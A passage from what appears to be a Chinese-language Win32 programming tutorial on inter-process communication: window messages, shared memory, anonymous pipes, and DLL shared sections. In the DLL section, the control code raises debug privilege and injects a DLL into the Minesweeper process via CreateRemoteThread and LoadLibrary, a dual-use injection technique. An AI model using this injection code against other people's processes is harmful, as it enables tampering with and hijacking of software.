class="hljs-comment">//SendMessage(hwnd,WM_USER+0x1,NULL, (LPARAM)100); </span><br>PostMessage(hwnd,WM_USER+<span class="hljs-number">0x1</span>, <span class="hljs-literal">NULL</span>, (LPARAM)<span class="hljs-number">100</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="接收端代码"><a href="#接收端代码" class="headerlink" title="接收端代码"></a>接收端代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">switch</span>(uMsg)<br>&#123;<br>    <span class="hljs-keyword">case</span> WM_CLOSE:<br>    &#123;<br>    EndDialog(hDlg,<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">case</span> WM_USER+<span class="hljs-number">0x1</span>:<br>    &#123;<br>    DWORD x = wParam;<br>    DWORD y = lParam;<br><br>    MessageBox(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">case</span> WM_COMMAND:<br>    &#123;<br>    <span class="hljs-keyword">switch</span> (LOWORD (wParam))<br>    &#123;<br>            <span class="hljs-keyword">case</span> IDC_BUTTON_RECV:<br>            &#123;<br>                <span class="hljs-keyword">return</span> TRUE;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">break</span> ;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="共享内存"><a href="#共享内存" class="headerlink" title="共享内存"></a>共享内存</h2><p>Win32 API中共享内存(Shared Memory)是文件映射的一种特殊情况。进程在创建文件映射对象时用0xFFFFFFFF来代替文件句柄(HANDLE)，就表示了对应的文件映射对象是从操作系统页面文件访问内存，其它进程打开该文件映射对象就可以访问该内存块。</p><blockquote><p>补充：关于文件映射</p><p>文件映射(Memory-Mapped Files)能使进程把文件内容当作进程地址区间一块内存那样来对待。因此，进程不必使用文件I&#x2F;O操作，只需简单的指针操作就可读取和修改文件的内容。</p><p>Win32 API允许多个进程访问同一文件映射对象，各个进程在它自己的地址空间里接收内存的指针。通过使用这些指针，不同进程就可以读或修改文件的内容，实现了对文件中数据的共享。</p></blockquote><h3 id="发送端代码-1"><a href="#发送端代码-1" class="headerlink" title="发送端代码"></a>发送端代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> _tmain(<span class="hljs-type">int</span> argc, _TCHAR* argv[])<br>&#123;<br>HANDLE hMapObject;<br>HANDLE hMapView;<br><br><span class="hljs-comment">//创建FileMapping对象</span><br>hMapObject = CreateFileMapping((HANDLE)<span class="hljs-number">0xFFFFFFFF</span>,<span class="hljs-literal">NULL</span>,PAGE_READWRITE,<span class="hljs-number">0</span>,<span class="hljs-number">0x1000</span>,TEXT(<span class="hljs-string">&quot;shared&quot;</span>));<br><span class="hljs-keyword">if</span>(!hMapObject)<br>&#123;<br>MessageBox(<span class="hljs-literal">NULL</span>,TEXT(<span class="hljs-string">&quot;共享内存失败&quot;</span>),TEXT(<span class="hljs-string">&quot;Error&quot;</span>),MB_OK);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">//将FileMapping对象映射到自己的进程</span><br>hMapView = MapViewOfFile(hMapObject,FILE_MAP_WRITE,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(!hMapView)<br>&#123;<br>MessageBox(<span class="hljs-literal">NULL</span>,TEXT(<span class="hljs-string">&quot;内存映射失败&quot;</span>),TEXT(<span class="hljs-string">&quot;Error&quot;</span>),MB_OK);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">//向共享内存写入数据</span><br><span class="hljs-built_in">strcpy</span>((<span class="hljs-type">char</span>*)hMapView,<span class="hljs-string">&quot;Test Shared Memery&quot;</span>);<br>getchar();<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="接收端代码-1"><a href="#接收端代码-1" class="headerlink" title="接收端代码"></a>接收端代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// shared_memory_receive.cpp : 定义控制台应用程序的入口点。</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdafx.h&quot;</span></span><br><br><br><span class="hljs-type">int</span> _tmain(<span class="hljs-type">int</span> argc, _TCHAR* argv[])<br>&#123;<br>HANDLE hMapObject;<br>HANDLE hMapView;<br><br><span class="hljs-comment">//创建FileMapping对象</span><br>hMapObject = CreateFileMapping((HANDLE)<span class="hljs-number">0xFFFFFFFF</span>,<span class="hljs-literal">NULL</span>,PAGE_READWRITE,<span class="hljs-number">0</span>,<span class="hljs-number">0x1000</span>,TEXT(<span class="hljs-string">&quot;shared&quot;</span>));<br><span class="hljs-keyword">if</span>(!hMapObject)<br>&#123;<br>MessageBox(<span class="hljs-literal">NULL</span>,TEXT(<span class="hljs-string">&quot;共享内存失败&quot;</span>),TEXT(<span class="hljs-string">&quot;Error&quot;</span>),MB_OK);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">//将FileMapping对象映射到自己的进程</span><br>hMapView = MapViewOfFile(hMapObject,FILE_MAP_WRITE,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(!hMapView)<br>&#123;<br>MessageBox(<span class="hljs-literal">NULL</span>,TEXT(<span class="hljs-string">&quot;内存映射失败&quot;</span>),TEXT(<span class="hljs-string">&quot;Error&quot;</span>),MB_OK);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">//从共享内存读取数据</span><br>TCHAR szBuffer[<span class="hljs-number">0x1000</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br><span class="hljs-built_in">memcpy</span>(szBuffer,hMapView,<span class="hljs-number">10</span>);<br>MessageBox(<span class="hljs-literal">NULL</span>,szBuffer,TEXT(<span class="hljs-string">&quot;从发送端接收到数据&quot;</span>),MB_OK);<br>getchar();<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h3><p>同时运行发送端和接收端代码，结果如下：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image-20220220110439582.png" alt="image-20220220110439582"></p><h2 id="匿名管道"><a href="#匿名管道" class="headerlink" title="匿名管道"></a>匿名管道</h2><p>匿名管道不需要知道创建对象管道的名字。它是通过内核对象的可继承性进行的，也就是说匿名管道只能作用于父子进程之间，在父进程创建子进程的时候通过对CreateProcess函数中传参，即可让子进程获得父进程的内核对象句柄。</p><p>匿名管道是单机上实现子进程标准I&#x2F;O重定向的有效方法，它不能在网上使用，也不能用于两个不相关的进程之间。</p><p>具体实现细节，请参考《Windows核心编程》内核对象一章。</p><blockquote><p>补充：关于<strong>命</strong>名管道</p><p>命名管道(Named Pipe)是服务器进程和一个或多个客户进程之间通信的单向或双向管道。不同于匿名管道的是命名管道可以在不相关的进程之间和不同计算机之间使用，服务器建立命名管道时给它指定一个名字，任何进程都可以通过该名字打开管道的另一端，根据给定的权限和服务器进程通信。</p></blockquote><h3 id="父进程代码"><a href="#父进程代码" class="headerlink" title="父进程代码"></a>父进程代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// anonymous_pipe_parent.cpp : 定义控制台应用程序的入口点。</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdafx.h&quot;</span></span><br><br><br><span class="hljs-type">int</span> _tmain(<span class="hljs-type">int</span> argc, _TCHAR* argv[])<br>&#123;<br>HANDLE hParentRead;<br>HANDLE hParentWrite;<br>HANDLE hChildRead;<br>HANDLE hChildWrite;<br><br>SECURITY_ATTRIBUTES sa;<br><br>sa.bInheritHandle = TRUE;<br>sa.lpSecurityDescriptor = <span class="hljs-literal">NULL</span>;<br>sa.nLength = <span class="hljs-keyword">sizeof</span>(SECURITY_ATTRIBUTES);<br><br><span class="hljs-keyword">if</span>(!CreatePipe(&amp;hParentRead,&amp;hChildWrite,&amp;sa,<span class="hljs-number">0</span>))<br>&#123;<br>MessageBox(<span class="hljs-number">0</span>,TEXT(<span class="hljs-string">&quot;创建匿名管道失败!&quot;</span>),TEXT(<span class="hljs-string">&quot;Error&quot;</span>),MB_OK);<br>&#125;<br><span class="hljs-keyword">if</span>(!CreatePipe(&amp;hChildRead,&amp;hParentWrite,&amp;sa,<span class="hljs-number">0</span>))<br>&#123;<br>MessageBox(<span class="hljs-number">0</span>,TEXT(<span class="hljs-string">&quot;创建匿名管道失败!&quot;</span>),TEXT(<span class="hljs-string">&quot;Error&quot;</span>),MB_OK);<br>&#125;<br><br>STARTUPINFO si;<br>PROCESS_INFORMATION pi;<br><br>ZeroMemory(&amp;si,<span class="hljs-keyword">sizeof</span>(STARTUPINFO));<br><br>si.cb = <span class="hljs-keyword">sizeof</span>(STARTUPINFO);<br>si.dwFlags = STARTF_USESTDHANDLES;<br>si.hStdInput = hChildRead;<br>si.hStdOutput = hChildWrite;<br>si.hStdError = GetStdHandle(STD_ERROR_HANDLE);<br><br>LPTSTR szFileName = <span class="hljs-string">&quot;C:\\Users\\admin\\Documents\\visual studio 2012\\Projects\\anonymous_pipe_child\\Debug\\anonymous_pipe_child.exe&quot;</span>;<br><span class="hljs-keyword">if</span>(!CreateProcess(szFileName,<span class="hljs-string">&quot;child&quot;</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>,TRUE,CREATE_NEW_CONSOLE,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>,&amp;si,&amp;pi))<br>&#123;<br>CloseHandle(hParentRead);<br>CloseHandle(hParentWrite);<br>hParentRead = <span class="hljs-literal">NULL</span>;<br>hParentWrite = <span class="hljs-literal">NULL</span>;<br><br>CloseHandle(hChildRead);<br>CloseHandle(hChildWrite);<br>hChildRead = <span class="hljs-literal">NULL</span>;<br>hChildWrite = <span class="hljs-literal">NULL</span>;<br>MessageBox(<span class="hljs-number">0</span>,TEXT(<span class="hljs-string">&quot;创建子进程失败!&quot;</span>),TEXT(<span class="hljs-string">&quot;Error&quot;</span>),MB_OK);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>CloseHandle(pi.hProcess);<br>CloseHandle(pi.hThread);<br>&#125;<br><br><br><br><span class="hljs-comment">//写数据</span><br>TCHAR szWriteBuffer[] = <span class="hljs-string">&quot;父进程：http:\\www.dtdebug.com&quot;</span>;<br>DWORD dwWrite;<br><span class="hljs-keyword">if</span>(!WriteFile(hParentWrite,szWriteBuffer,<span class="hljs-built_in">strlen</span>(szWriteBuffer)+<span class="hljs-number">1</span>,&amp;dwWrite,<span class="hljs-literal">NULL</span>))<br>&#123;<br>MessageBox(<span class="hljs-number">0</span>,TEXT(<span class="hljs-string">&quot;父进程写数据失败!&quot;</span>),TEXT(<span class="hljs-string">&quot;Error&quot;</span>),MB_OK);<br>&#125;<br><br>Sleep(<span class="hljs-number">5000</span>);<br><br><span class="hljs-comment">//读数据</span><br>TCHAR szReadBuffer[<span class="hljs-number">100</span>];<br>DWORD dwRead;<br><span class="hljs-keyword">if</span>(!ReadFile(hParentRead,szReadBuffer,<span class="hljs-number">100</span>,&amp;dwRead,<span class="hljs-literal">NULL</span>))<br>&#123;<br>MessageBox(<span class="hljs-literal">NULL</span>,TEXT(<span class="hljs-string">&quot;父进程读取数据失败!&quot;</span>),TEXT(<span class="hljs-string">&quot;Error&quot;</span>),MB_OK);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>MessageBox(<span class="hljs-literal">NULL</span>,szReadBuffer,TEXT(<span class="hljs-string">&quot;[父进程读取数据]&quot;</span>),MB_OK);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><h3 id="子进程代码"><a href="#子进程代码" class="headerlink" title="子进程代码"></a>子进程代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// anonymous_pipe_child.cpp : 定义控制台应用程序的入口点。</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdafx.h&quot;</span></span><br><br><br><span class="hljs-type">int</span> _tmain(<span class="hljs-type">int</span> argc, _TCHAR* argv[])<br>&#123;<br>Sleep(<span class="hljs-number">1000</span>);<br><span class="hljs-comment">//初始化</span><br>HANDLE hRead = GetStdHandle(STD_INPUT_HANDLE);<br>HANDLE hWrite = GetStdHandle(STD_OUTPUT_HANDLE);  <br><br><span class="hljs-comment">//读数据</span><br>TCHAR szReadBuffer[<span class="hljs-number">100</span>];<br>DWORD dwRead;<br><span class="hljs-keyword">if</span>(!ReadFile(hRead,szReadBuffer,<span class="hljs-number">100</span>,&amp;dwRead,<span class="hljs-literal">NULL</span>))<br>&#123;<br>MessageBox(<span class="hljs-literal">NULL</span>,TEXT(<span class="hljs-string">&quot;子进程读取数据失败!&quot;</span>),TEXT(<span class="hljs-string">&quot;Error&quot;</span>),MB_OK);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>MessageBox(<span class="hljs-literal">NULL</span>,szReadBuffer,TEXT(<span class="hljs-string">&quot;[子进程读取数据]&quot;</span>),MB_OK);<br>&#125;<br><br>Sleep(<span class="hljs-number">3000</span>);<br><br><span class="hljs-comment">//写数据</span><br>TCHAR szWriteBuffer[<span class="hljs-number">100</span>] = <span class="hljs-string">&quot;子进程：匿名管道&quot;</span>;<br>DWORD dwWrite;<br><span class="hljs-keyword">if</span>(!WriteFile(hWrite,szWriteBuffer,<span class="hljs-built_in">strlen</span>(szWriteBuffer)+<span class="hljs-number">1</span>,&amp;dwWrite,<span class="hljs-literal">NULL</span>))<br>&#123;<br>MessageBox(<span class="hljs-literal">NULL</span>,TEXT(<span class="hljs-string">&quot;子进程写入数据失败!&quot;</span>),TEXT(<span class="hljs-string">&quot;Error&quot;</span>),MB_OK);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><h3 id="运行结果-1"><a href="#运行结果-1" class="headerlink" title="运行结果"></a>运行结果</h3><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image-20220220110717042.png" alt="image-20220220110717042"></p><h2 id="DLL共享节"><a href="#DLL共享节" class="headerlink" title="DLL共享节"></a>DLL共享节</h2><p>DLL共享节技术可以让使用同一个DLL的多个进程共享一块内存（共享节）。</p><blockquote><p>我的理解是DLL共享节和共享内存技术有异曲同工之妙。它们的技术思想都是相同的，不同的是DLL共享节使用的是低2G的内存（DLL中），而共享内存使用的是高2G的内存。</p></blockquote><h3 id="控制侧代码"><a href="#控制侧代码" class="headerlink" title="控制侧代码"></a>控制侧代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdafx.h&quot;</span></span><br><br><span class="hljs-comment">// 远程线程注入</span><br>BOOL <span class="hljs-title function_">InjectDLL</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-comment">// 提权(win10)</span><br>EnableDebugPrivilege();<br><span class="hljs-comment">// 根据窗口名获取进程句柄</span><br>HWND hWnd = FindWindow(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;扫雷&quot;</span>);<br><span class="hljs-keyword">if</span> (hWnd == <span class="hljs-literal">NULL</span>)<br>&#123;<br>OutputDebugString(<span class="hljs-string">&quot;获取窗口句柄失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>DWORD dwPid = <span class="hljs-number">-1</span>;<br>GetWindowThreadProcessId(hWnd, &amp;dwPid);<br>HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);<br><span class="hljs-keyword">if</span> (hProcess == INVALID_HANDLE_VALUE)<br>&#123;<br>OutputDebugString(<span class="hljs-string">&quot;打开进程失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">// 在要注入的进程中申请一块内存，作为LoadLibrary的参数</span><br><span class="hljs-type">char</span> szDllName[MAX_PATH] = <span class="hljs-string">&quot;DLLShareSection-DLL.dll&quot;</span>;<br>LPVOID pAddress = VirtualAllocEx(hProcess, <span class="hljs-literal">NULL</span>, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);<br>WriteProcessMemory(hProcess, pAddress, szDllName, <span class="hljs-built_in">strlen</span>(szDllName), <span class="hljs-literal">NULL</span>);<br><span class="hljs-comment">// 创建远程线程，线程入口设置为LoadLibrary，这样就可以自动加载dll</span><br>HANDLE hThread = CreateRemoteThread(hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)LoadLibrary, pAddress, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-comment">//VirtualFreeEx(hProcess, pAddress, 0, MEM_RELEASE);</span><br>CloseHandle(hProcess);<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><span class="hljs-comment">// 提权函数：提升为DEBUG权限</span><br>BOOL <span class="hljs-title function_">EnableDebugPrivilege</span><span class="hljs-params">()</span><br>&#123;<br>HANDLE hToken;<br>BOOL fOk = FALSE;<br><span class="hljs-keyword">if</span> (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken))<br>&#123;<br>TOKEN_PRIVILEGES tp;<br>tp.PrivilegeCount = <span class="hljs-number">1</span>;<br>LookupPrivilegeValue(<span class="hljs-literal">NULL</span>, SE_DEBUG_NAME, &amp;tp.Privileges[<span class="hljs-number">0</span>].Luid);<br><br>tp.Privileges[<span class="hljs-number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;<br>AdjustTokenPrivileges(hToken, FALSE, &amp;tp, <span class="hljs-keyword">sizeof</span>(tp), <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><br>fOk = (GetLastError() == ERROR_SUCCESS);<br>CloseHandle(hToken);<br>&#125;<br><span class="hljs-keyword">return</span> fOk;<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-keyword">if</span> (FALSE == InjectDLL())<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;注入DLL失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;注入DLL成功\n&quot;</span>);<br>&#125;<br><br>HMODULE hModule = LoadLibrary(<span class="hljs-string">&quot;DLLShareSection-DLL.dll&quot;</span>);<br><span class="hljs-keyword">if</span> (hModule == <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取DLL句柄失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">void</span> <span class="hljs-params">(*PFNSETDATA)</span><span class="hljs-params">(<span class="hljs-type">char</span> *, DWORD)</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">void</span> <span class="hljs-params">(*PFNGETDATA)</span><span class="hljs-params">(<span class="hljs-type">char</span> *)</span>;<br>PFNSETDATA pFnSetData = (PFNSETDATA)GetProcAddress(hModule, <span class="hljs-string">&quot;SetData&quot;</span>);<br>PFNGETDATA pFnGetData = (PFNGETDATA)GetProcAddress(hModule, <span class="hljs-string">&quot;GetData&quot;</span>);<br><span class="hljs-type">char</span> szBuffer[<span class="hljs-number">0x1000</span>];<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;输入要发送的数据: &quot;</span>);<br>ZeroMemory(szBuffer, <span class="hljs-number">0x1000</span>);<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, szBuffer);<br>pFnSetData(szBuffer, <span class="hljs-built_in">strlen</span>(szBuffer));<br><span class="hljs-comment">//pFnGetData(szBuffer);</span><br><span class="hljs-comment">//printf(&quot;修改数据成功，当前数据: %s\n&quot;, szBuffer);</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(szBuffer, <span class="hljs-string">&quot;quit&quot;</span>) == <span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><h3 id="DLL侧代码"><a href="#DLL侧代码" class="headerlink" title="DLL侧代码"></a>DLL侧代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdafx.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> data_seg(<span class="hljs-string">&quot;Shared&quot;</span>)</span><br><br><span class="hljs-type">char</span> g_buffer[<span class="hljs-number">0x1000</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> data_seg()</span><br><span class="hljs-meta">#<span 